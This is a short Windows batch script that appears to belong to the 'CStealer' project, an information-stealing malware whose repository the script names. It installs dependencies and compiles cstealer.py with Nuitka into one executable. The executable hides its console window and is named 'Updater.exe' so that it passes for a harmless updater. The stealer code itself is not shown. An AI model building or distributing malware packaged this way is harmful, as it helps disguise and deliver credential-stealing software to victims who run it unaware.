@echo off
title github.com/86FX/CStealer
cd %~dp0 &:: Enter current directory
python -m pip install -U -r requirements.txt  &:: Install requirements
python -m nuitka --onefile --assume-yes-for-downloads --plugin-enable=multiprocessing --windows-disable-console --output-file="Updater.exe" --python-flag=no_docstrings cstealer.py &:: Build
pause
